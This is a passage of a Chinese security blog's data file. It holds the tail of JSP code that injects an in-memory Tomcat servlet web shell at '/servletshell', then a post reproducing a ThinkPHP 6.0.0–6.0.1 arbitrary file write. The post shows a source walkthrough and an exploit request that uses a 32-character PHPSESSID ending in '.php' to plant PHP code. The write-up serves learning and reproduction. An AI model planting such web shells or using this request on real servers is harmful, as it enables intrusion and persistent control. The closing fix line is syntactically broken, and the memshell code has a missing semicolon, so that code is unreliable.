-1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //获取context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">      //创建自定义wrapper</span><br><span class=\"line\">    Servletshell shell=new Servletshell()</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br><span class=\"line\">    shellWrapper.setParent(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取service属性</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //获取contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //调用addWrapper方法</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>简短了很多</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>在实现servlet内存马的过程中，没有像以前一样，完全照着资料做，大部分都是自己来调试，花的时间确实要多了一些，不过感觉这样的影响更深刻，还可以有一些自己的理解，感觉很好。不过因为许多是自己的理解，所以肯定会有错误的地方，希望各位师傅不吝赐教。</p>\n"},{"title":"thinkphp6任意文件写入","date":"2022-11-13T14:53:21.000Z","excerpt":"thinkphp6任意文件写入","_content":"\n# thinkphp6任意文件写入漏洞复现过程\n\n###tips\n\n仅适用于thinkphp6.0.0~6.0.1\n\n\n## 一.搭建环境\n\n这里踩了很多坑，最终供选择用`phpstudy`来搭建环境\n\n#### 1.安装phpstudy\n\n直接在官网下载即可\n\n链接：https://www.xp.cn/download.html\n\n#### 2.安装composer\n\n![图片-1667831973498](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446192.png)\n\n值得注意的是我们这里用的composer的版本是1.8.5\n\n在安装tp6的时候可能会报错，我们需要去更新\n\n```\ncomposer self-update//更新版本\n```\n\n#### 3.创建站点\n\n#### ![图片-1667831982656](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446455.png)4.安装tp6\n\n点击管理中的`composer`，点击确定\n\n```\ncomposer create-project topthink/think tp6    //安装tp6\n```\n\n\n\n![图片-1667831995098](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447839.png)\n\n访问成功\n\n![图片-1667832028137](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447681.png)\n\n\n\n## 二.漏洞利用\n\n#### 1.分析\n\n首先这个洞，我理解是sessionid为进行效验，可以导致传入任意字符，例如xxx.php。而且一般来说sessionid会作为文件名创建对应的文件保存。这是第一步我们的已经实现文件可控，如果session文件再往里面写东西要是可控的话，这样不就可以getshell了，所以我构造了上面的控制器。\n\n漏洞首先出现的地方是 sessionid可控\n`tp6/vendor/topthink/framework/src/think/session/Store.php`\n121行\n\n```php\n $this->id = is_string($id) && strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());\n```\n\nsessionid在设置的时候为进行校验，只要是32位就可以\n\n\n\n然后再看看同一个文件的session保存\n\n`tp6/vendor/topthink/framework/src/think/session/Store.php`\n\n254行\n\n```php\n\tpublic function save(): void\n    {\n        $this->clearFlashData();\n\n        $sessionId = $this->getId();\n\n        if (!empty($this->data)) {\n            $data = $this->serialize($this->data);\n\n            $this->handler->write($sessionId, $data);\n        } else {\n            $this->handler->delete($sessionId);\n        }\n\n        $this->init = false;\n    }\n\n\n```\n\n先获取session id 然后是 `$this->handler->write($sessionId, $data);;`\n 在跟进一下handler\n 只有一个构造函数的初始化 变成一个 SessionHandlerInterface $handler\n\n```php\npublic function __construct($name, SessionHandlerInterface $handler, array $serialize = null)\n    {\n        $this->name    = $name;\n        $this->handler = $handler;\n\n        if (!empty($serialize)) {\n            $this->serialize = $serialize;\n        }\n\n        $this->setId();\n    }\n```\n\n tp6/vendor/topthink/framework/src/think/middleware/SessionInit.php\n 这里获取到 PHPSESSID 的值 session id传入\n\n```php\n  if ($varSessionId && $request->request($varSessionId)) {\n            $sessionId = $request->request($varSessionId);\n        } else {\n            $sessionId = $request->cookie($cookieName);\n        }\n\n        if ($sessionId) {\n            $this->session->setId($sessionId);\n\n```\n\n```php\n$request->cookie($cookieName);这个里面看一下\n\nprotected $name = 'PHPSESSID'; 发现是这个参数\n\n//所以这个值就从PHPSESSID传就好了\n\n```\n\n然后传入Store 中 setId(）函数判断，值检查了32位 就是第一个说的地方\n\n最后保存session数据 在代码tp6/vendor/topthink/framework/src/think/session/Store.php\n 跟进这个write方法\n\n```php\n$this->handler->write($sessionId, $data);\n//这里的 handler 是  继承的think\\session\\driver\\file.php\n```\n\n跟进这个write方法\n tp6/vendor/topthink/framework/src/think/session/driver/File.php\n\n```php\npublic function write(string $sessID, string $sessData): bool\n    {\n        $filename = $this->getFileName($sessID, true);\n        $data     = $sessData;\n\n        if ($this->config['data_compress'] && function_exists('gzcompress')) {\n            //数据压缩\n            $data = gzcompress($data, 3);\n        }\n\n        return $this->writeFile($filename, $data);\n    }\n\n```\n\n文件名处理方式\n\n```php\ngetFileName($sessID, true);\n```\n\n```php\nprotected function getFileName(string $name, bool $auto = false): string\n    {\n        if ($this->config['prefix']) {\n            // 使用子目录\n            $name = $this->config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name;\n        } else {\n            $name = 'sess_' . $name;\n        }\n\n        $filename = $this->config['path'] . $name;\n        $dir      = dirname($filename);\n\n        if ($auto && !is_dir($dir)) {\n            try {\n                mkdir($dir, 0755, true);\n            } catch (\\Exception $e) {\n                // 创建失败\n            }\n        }\n\n        return $filename;\n    }\n\n```\n\n由此可知，文件名只进行了路径拼接和加前缀\n\n跟进 `$this->writeFile($filename, $data);`\n\n```php\n protected function writeFile($path, $content): bool\n    {\n        return (bool) file_put_contents($path, $content, LOCK_EX);\n    }\n```\n\n这里直接写入了，文件名可控，xxxxx.php里面是序列化后的内容\n\n#### 2.利用\n\n直接用`burpsuite`先抓一个包\n\n```\nGET /tp6/public/index.php?a=%3C?php%20phpinfo();?%3E HTTP/1.1\nHost: tp6.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: PHPSESSID=e956ce73b3edb461e7e8b5f05d24bb53\nUpgrade-Insecure-Requests: 1\n\n```\n\n这里我们通过修改PHPSESSID来进行利用，\n\n值得注意的是这里我们构造的长度必须是**<u>32</u>**位\n\n```\nPHPSESSID=1234567890123456789012345678.php\n```\n\n一般位于项目根目录下的./runtime/session/文件夹下，\n 加上之前前缀的拼接，那就是\n /runtime/session/sess_1234567890123456789012345678.php\n\n![图片-1667832045580](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151448676.png)\n\n成功！\n\n#### 3.修复方法\n\n这个漏洞的核心在于对sessionid审核的不够严密，仅仅满足32位是远远不够的，这里我们用`ctype_alnum`函数\n\n> ## PHP ctype_alnum()函数 **(**PHP ctype_alnum() function**)**\n>\n> **ctype_alnum() function** is a character type (CType) function in PHP, it is used to check whether a given string [contains](https://so.csdn.net/so/search?q=contains&spm=1001.2101.3001.7020) alphanumeric characters or not.\n>\n> **ctype_alnum()函数**是PHP中的字符类型(CType)函数，用于检查给定的字符串是否包含字母数字字符。 \n>\n> It returns true – if the string contains alphanumeric value (i.e. alphabets, digits/number only), else it returns false.\n>\n> 它返回true -如果字符串包含字母数字值(即字母，数字只/数字)，否则返回FALSE。 \n\n修改如下\n\n```php\n$this->id = is_string($id) && strlen($id) === 32 ctype_alnum（$id） && ? $id : md5(microtime(true) . session_create_id());\n\n```","source":"_posts/thinkphp6任意文件写入漏洞复现过程.md","raw":"---\ntitle: thinkphp6任意文件写入\ndate: 2022-11-13 22:53:21\nexcerpt: thinkphp6任意文件写入\ncategories: 复现\n---\n\n# thinkphp6任意文件写入漏洞复现过程\n\n###tips\n\n仅适用于thinkphp6.0.0~6.0.1\n\n\n## 一.搭建环境\n\n这里踩了很多坑，最终供选择用`phpstudy`来搭建环境\n\n#### 1.安装phpstudy\n\n直接在官网下载即可\n\n链接：https://www.xp.cn/download.html\n\n#### 2.安装composer\n\n![图片-1667831973498](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446192.png)\n\n值得注意的是我们这里用的composer的版本是1.8.5\n\n在安装tp6的时候可能会报错，我们需要去更新\n\n```\ncomposer self-update//更新版本\n```\n\n#### 3.创建站点\n\n#### ![图片-1667831982656](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446455.png)4.安装tp6\n\n点击管理中的`composer`，点击确定\n\n```\ncomposer create-project topthink/think tp6    //安装tp6\n```\n\n\n\n![图片-1667831995098](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447839.png)\n\n访问成功\n\n![图片-1667832028137](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447681.png)\n\n\n\n## 二.漏洞利用\n\n#### 1.分析\n\n首先这个洞，我理解是sessionid为进行效验，可以导致传入任意字符，例如xxx.php。而且一般来说sessionid会作为文件名创建对应的文件保存。这是第一步我们的已经实现文件可控，如果session文件再往里面写东西要是可控的话，这样不就可以getshell了，所以我构造了上面的控制器。\n\n漏洞首先出现的地方是 sessionid可控\n`tp6/vendor/topthink/framework/src/think/session/Store.php`\n121行\n\n```php\n $this->id = is_string($id) && strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());\n```\n\nsessionid在设置的时候为进行校验，只要是32位就可以\n\n\n\n然后再看看同一个文件的session保存\n\n`tp6/vendor/topthink/framework/src/think/session/Store.php`\n\n254行\n\n```php\n\tpublic function save(): void\n    {\n        $this->clearFlashData();\n\n        $sessionId = $this->getId();\n\n        if (!empty($this->data)) {\n            $data = $this->serialize($this->data);\n\n            $this->handler->write($sessionId, $data);\n        } else {\n            $this->handler->delete($sessionId);\n        }\n\n        $this->init = false;\n    }\n\n\n```\n\n先获取session id 然后是 `$this->handler->write($sessionId, $data);;`\n 在跟进一下handler\n 只有一个构造函数的初始化 变成一个 SessionHandlerInterface $handler\n\n```php\npublic function __construct($name, SessionHandlerInterface $handler, array $serialize = null)\n    {\n        $this->name    = $name;\n        $this->handler = $handler;\n\n        if (!empty($serialize)) {\n            $this->serialize = $serialize;\n        }\n\n        $this->setId();\n    }\n```\n\n tp6/vendor/topthink/framework/src/think/middleware/SessionInit.php\n 这里获取到 PHPSESSID 的值 session id传入\n\n```php\n  if ($varSessionId && $request->request($varSessionId)) {\n            $sessionId = $request->request($varSessionId);\n        } else {\n            $sessionId = $request->cookie($cookieName);\n        }\n\n        if ($sessionId) {\n            $this->session->setId($sessionId);\n\n```\n\n```php\n$request->cookie($cookieName);这个里面看一下\n\nprotected $name = 'PHPSESSID'; 发现是这个参数\n\n//所以这个值就从PHPSESSID传就好了\n\n```\n\n然后传入Store 中 setId(）函数判断，值检查了32位 就是第一个说的地方\n\n最后保存session数据 在代码tp6/vendor/topthink/framework/src/think/session/Store.php\n 跟进这个write方法\n\n```php\n$this->handler->write($sessionId, $data);\n//这里的 handler 是  继承的think\\session\\driver\\file.php\n```\n\n跟进这个write方法\n tp6/vendor/topthink/framework/src/think/session/driver/File.php\n\n```php\npublic function write(string $sessID, string $sessData): bool\n    {\n        $filename = $this->getFileName($sessID, true);\n        $data     = $sessData;\n\n        if ($this->config['data_compress'] && function_exists('gzcompress')) {\n            //数据压缩\n            $data = gzcompress($data, 3);\n        }\n\n        return $this->writeFile($filename, $data);\n    }\n\n```\n\n文件名处理方式\n\n```php\ngetFileName($sessID, true);\n```\n\n```php\nprotected function getFileName(string $name, bool $auto = false): string\n    {\n        if ($this->config['prefix']) {\n            // 使用子目录\n            $name = $this->config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name;\n        } else {\n            $name = 'sess_' . $name;\n        }\n\n        $filename = $this->config['path'] . $name;\n        $dir      = dirname($filename);\n\n        if ($auto && !is_dir($dir)) {\n            try {\n                mkdir($dir, 0755, true);\n            } catch (\\Exception $e) {\n                // 创建失败\n            }\n        }\n\n        return $filename;\n    }\n\n```\n\n由此可知，文件名只进行了路径拼接和加前缀\n\n跟进 `$this->writeFile($filename, $data);`\n\n```php\n protected function writeFile($path, $content): bool\n    {\n        return (bool) file_put_contents($path, $content, LOCK_EX);\n    }\n```\n\n这里直接写入了，文件名可控，xxxxx.php里面是序列化后的内容\n\n#### 2.利用\n\n直接用`burpsuite`先抓一个包\n\n```\nGET /tp6/public/index.php?a=%3C?php%20phpinfo();?%3E HTTP/1.1\nHost: tp6.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: PHPSESSID=e956ce73b3edb461e7e8b5f05d24bb53\nUpgrade-Insecure-Requests: 1\n\n```\n\n这里我们通过修改PHPSESSID来进行利用，\n\n值得注意的是这里我们构造的长度必须是**<u>32</u>**位\n\n```\nPHPSESSID=1234567890123456789012345678.php\n```\n\n一般位于项目根目录下的./runtime/session/文件夹下，\n 加上之前前缀的拼接，那就是\n /runtime/session/sess_1234567890123456789012345678.php\n\n![图片-1667832045580](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151448676.png)\n\n成功！\n\n#### 3.修复方法\n\n这个漏洞的核心在于对sessionid审核的不够严密，仅仅满足32位是远远不够的，这里我们用`ctype_alnum`函数\n\n> ## PHP ctype_alnum()函数 **(**PHP ctype_alnum() function**)**\n>\n> **ctype_alnum() function** is a character type (CType) function in PHP, it is used to check whether a given string [contains](https://so.csdn.net/so/search?q=contains&spm=1001.2101.3001.7020) alphanumeric characters or not.\n>\n> **ctype_alnum()函数**是PHP中的字符类型(CType)函数，用于检查给定的字符串是否包含字母数字字符。 \n>\n> It returns true – if the string contains alphanumeric value (i.e. alphabets, digits/number only), else it returns false.\n>\n> 它返回true -如果字符串包含字母数字值(即字母，数字只/数字)，否则返回FALSE。 \n\n修改如下\n\n```php\n$this->id = is_string($id) && strlen($id) === 32 ctype_alnum（$id） && ? $id : md5(microtime(true) . session_create_id());\n\n```","slug":"thinkphp6任意文件写入漏洞复现过程","published":1,"updated":"2024-04-17T08:43:00.807Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7j3000lh776ev30c38r","content":"<h1 id=\"thinkphp6任意文件写入漏洞复现过程\"><a href=\"#thinkphp6任意文件写入漏洞复现过程\" class=\"headerlink\" title=\"thinkphp6任意文件写入漏洞复现过程\"></a>thinkphp6任意文件写入漏洞复现过程</h1><p>###tips</p>\n<p>仅适用于thinkphp6.0.0~6.0.1</p>\n<h2 id=\"一-搭建环境\"><a href=\"#一-搭建环境\" class=\"headerlink\" title=\"一.搭建环境\"></a>一.搭建环境</h2><p>这里踩了很多坑，最终供选择用<code>phpstudy</code>来搭建环境</p>\n<h4 id=\"1-安装phpstudy\"><a href=\"#1-安装phpstudy\" class=\"headerlink\" title=\"1.安装phpstudy\"></a>1.安装phpstudy</h4><p>直接在官网下载即可</p>\n<p>链接：<a class=\"link\"   href=\"https://www.xp.cn/download.html\" >https://www.xp.cn/download.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h4 id=\"2-安装composer\"><a href=\"#2-安装composer\" class=\"headerlink\" title=\"2.安装composer\"></a>2.安装composer</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446192.png\"\n                        alt=\"图片-1667831973498\"\n                 ></p>\n<p>值得注意的是我们这里用的composer的版本是1.8.5</p>\n<p>在安装tp6的时候可能会报错，我们需要去更新</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer self-update//更新版本</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-创建站点\"><a href=\"#3-创建站点\" class=\"headerlink\" title=\"3.创建站点\"></a>3.创建站点</h4><h4 id=\"4-安装tp6\"><a href=\"#4-安装tp6\" class=\"headerlink\" title=\"4.安装tp6\"></a><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151446455.png\"\n                        alt=\"图片-1667831982656\"\n                 >4.安装tp6</h4><p>点击管理中的<code>composer</code>，点击确定</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">composer create-project topthink/think tp6    //安装tp6</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447839.png\"\n                        alt=\"图片-1667831995098\"\n                 ></p>\n<p>访问成功</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151447681.png\"\n                        alt=\"图片-1667832028137\"\n                 ></p>\n<h2 id=\"二-漏洞利用\"><a href=\"#二-漏洞利用\" class=\"headerlink\" title=\"二.漏洞利用\"></a>二.漏洞利用</h2><h4 id=\"1-分析\"><a href=\"#1-分析\" class=\"headerlink\" title=\"1.分析\"></a>1.分析</h4><p>首先这个洞，我理解是sessionid为进行效验，可以导致传入任意字符，例如xxx.php。而且一般来说sessionid会作为文件名创建对应的文件保存。这是第一步我们的已经实现文件可控，如果session文件再往里面写东西要是可控的话，这样不就可以getshell了，所以我构造了上面的控制器。</p>\n<p>漏洞首先出现的地方是 sessionid可控<br><code>tp6/vendor/topthink/framework/src/think/session/Store.php</code><br>121行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;id = <span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$id</span>) &amp;&amp; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$id</span>) === <span class=\"number\">32</span> ? <span class=\"variable\">$id</span> : <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">microtime</span>(<span class=\"literal\">true</span>) . <span class=\"title function_ invoke__\">session_create_id</span>());</span><br></pre></td></tr></table></figure>\n\n<p>sessionid在设置的时候为进行校验，只要是32位就可以</p>\n<p>然后再看看同一个文件的session保存</p>\n<p><code>tp6/vendor/topthink/framework/src/think/session/Store.php</code></p>\n<p>254行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">save</span>(<span class=\"params\"></span>): <span class=\"title\">void</span></span></span><br><span class=\"line\"><span class=\"function\">   </span>&#123;</span><br><span class=\"line\">       <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">clearFlashData</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"variable\">$sessionId</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">getId</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable language_\">$this</span>-&gt;data)) &#123;</span><br><span class=\"line\">           <span class=\"variable\">$data</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$this</span>-&gt;data);</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"variable language_\">$this</span>-&gt;handler-&gt;<span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$sessionId</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"variable language_\">$this</span>-&gt;handler-&gt;<span class=\"title function_ invoke__\">delete</span>(<span class=\"variable\">$sessionId</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"variable language_\">$this</span>-&gt;init = <span class=\"literal\">false</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>先获取session id 然后是 <code>$this-&gt;handler-&gt;write($sessionId, $data);;</code><br> 在跟进一下handler<br> 只有一个构造函数的初始化 变成一个 SessionHandlerInterface $handler</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, SessionHandlerInterface <span class=\"variable\">$handler</span>, <span class=\"keyword\">array</span> <span class=\"variable\">$serialize</span> = <span class=\"literal\">null</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name    = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;handler = <span class=\"variable\">$handler</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable\">$serialize</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;serialize = <span class=\"variable\">$serialize</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">setId</span>();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p> tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;middleware&#x2F;SessionInit.php<br> 这里获取到 PHPSESSID 的值 session id传入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$varSessionId</span> &amp;&amp; <span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">request</span>(<span class=\"variable\">$varSessionId</span>)) &#123;</span><br><span class=\"line\">          <span class=\"variable\">$sessionId</span> = <span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">request</span>(<span class=\"variable\">$varSessionId</span>);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          <span class=\"variable\">$sessionId</span> = <span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">cookie</span>(<span class=\"variable\">$cookieName</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable\">$sessionId</span>) &#123;</span><br><span class=\"line\">          <span class=\"variable language_\">$this</span>-&gt;session-&gt;<span class=\"title function_ invoke__\">setId</span>(<span class=\"variable\">$sessionId</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$request</span>-&gt;<span class=\"title function_ invoke__\">cookie</span>(<span class=\"variable\">$cookieName</span>);这个里面看一下</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;PHPSESSID&#x27;</span>; 发现是这个参数</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//所以这个值就从PHPSESSID传就好了</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后传入Store 中 setId(）函数判断，值检查了32位 就是第一个说的地方</p>\n<p>最后保存session数据 在代码tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;Store.php<br> 跟进这个write方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">$this</span>-&gt;handler-&gt;<span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$sessionId</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\"><span class=\"comment\">//这里的 handler 是  继承的think\\session\\driver\\file.php</span></span><br></pre></td></tr></table></figure>\n\n<p>跟进这个write方法<br> tp6&#x2F;vendor&#x2F;topthink&#x2F;framework&#x2F;src&#x2F;think&#x2F;session&#x2F;driver&#x2F;File.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\"><span class=\"keyword\">string</span> <span class=\"variable\">$sessID</span>, <span class=\"keyword\">string</span> <span class=\"variable\">$sessData</span></span>): <span class=\"title\">bool</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">       